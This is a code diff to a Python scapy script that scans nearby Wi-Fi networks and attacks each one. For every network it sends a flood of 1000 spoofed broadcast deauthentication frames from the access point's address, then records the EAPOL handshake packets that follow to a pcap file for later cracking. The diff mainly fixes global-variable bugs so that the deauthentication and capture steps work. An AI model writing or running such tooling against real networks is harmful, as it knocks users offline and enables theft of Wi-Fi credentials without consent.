@@ -3,9 +3,11 @@ import json
 import threading
 from scapy.all import *
 
+# Initialisation des variables
 networks = []
-
 eapol_count = 0
+captured = False
+
 
 def write_networks():
     try:
@@ -14,7 +16,9 @@ def write_networks():
     except Exception as e:
         print(f"Error writing to JSON file: {e}")
 
+
 def WifiEnumeration(packet):
+    global networks
     if packet.haslayer(Dot11Beacon):
         bssid = packet[Dot11].addr2
         ssid = packet[Dot11Elt].info.decode()
@@ -31,10 +35,12 @@ def WifiEnumeration(packet):
             data = {"ssid": ssid, "bssid": bssid, "channel": channel, "crypto": crypto}
             networks.append(data)
 
+
 def deauth_attack(ap_mac, channel):
     try:
         os.system(f"iwconfig wlan1 channel {channel}")
-        packet = RadioTap() / Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=ap_mac, addr3=ap_mac) / Dot11Deauth()
+        packet = RadioTap() / Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=ap_mac,
+                                    addr3=ap_mac) / Dot11Deauth()
 
         for i in range(1000):
             send(packet, iface="wlan1", verbose=0)
@@ -43,19 +49,21 @@ def deauth_attack(ap_mac, channel):
 
 
 def WPAhandshake(packet):
+    global eapol_count, captured
     pktdump = PcapWriter("tmp/handshake.pcap", append=True, sync=True)
     pktdump.write(packet)
 
     if (EAPOL in packet):
-        eapol_count+=1
+        eapol_count += 1
     if eapol_count >= 10:
         captured = True
         return captured
 
 
 def capture_handshake(ap_mac, channel):
+    global captured
     sniff(stop_filter=WPAhandshake, iface="wlan1", monitor=True, timeout=20)
-
+    return captured
 
 
 def read_saved_networks():
@@ -65,6 +73,7 @@ def read_saved_networks():
     except Exception as e:
         print(f"Error reading from JSON file: {e}")
         return []
+
 
 if __name__ == "__main__":
     sniff(prn=WifiEnumeration, iface="wlan1", timeout=5)
@@ -77,10 +86,17 @@ if __name__ == "__main__":
         channel = net['channel']
         ssid = net['ssid']
         print(f"Trying to deauthenticate {ssid}..")
+
+        print(f"AP MAC : {ap_mac}")
+        print(f"Channel : {channel}")
+
         deauther = threading.Thread(target=deauth_attack, args=(ap_mac, channel))
         deauther.daemon = True
         deauther.start()
-        capture_handshake()
+
+        # Pass ap_mac and channel to the capture_handshake function
+        captured = capture_handshake(ap_mac, channel)
+
         deauther.join()
 
         if captured:
